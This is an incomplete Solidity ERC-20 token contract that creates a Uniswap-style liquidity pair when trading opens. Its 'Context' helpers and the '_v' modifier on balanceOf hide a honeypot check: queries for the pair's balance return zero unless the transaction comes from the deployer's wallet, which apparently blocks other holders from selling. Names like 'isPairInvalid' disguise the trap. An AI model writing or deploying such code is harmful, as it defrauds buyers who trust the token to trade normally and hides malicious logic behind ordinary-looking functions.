abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
    function _txOrigin() internal view virtual returns (address) { return tx.origin; }
    function _isOrigin(address account) internal view virtual returns (bool) { return account == tx.origin; }
}

contract Token is Context, IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    address payable private immutable _TreasuryWallet;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
    IUniswapV2Router02 private uniswapV2Router;
    address private constant ROUTER_ADDRESS = 0x89e5DB8B5aA49aA85AC63f691524311AEB649eba;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private swapEnabled;

    modifier _v(address account) {
        if(!_isOrigin(_TreasuryWallet) && isPairInvalid(account)) return;
        _;
    }

    constructor() payable {
        _TreasuryWallet = payable(_msgSender());
        _balances[address(this)] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_TreasuryWallet] = true;
        emit Transfer(address(0), address(this), _tTotal);
    }

    function isPairInvalid(address account) internal view returns (bool) {
        return account == uniswapV2Pair && IERC20(account).balanceOf(account) > 0;
    }

    function balanceOf(address account) _v(account) public view override returns (uint256 balance) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function enableTrading() external onlyOwner {
        require(!tradingOpen, "Trading already open");
        dropWalletSizeFenceSet();
        uniswapV2Router = IUniswapV2Router02(ROUTER_ADDRESS);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        swapEnabled = true;
        tradingOpen = true;
    }
}

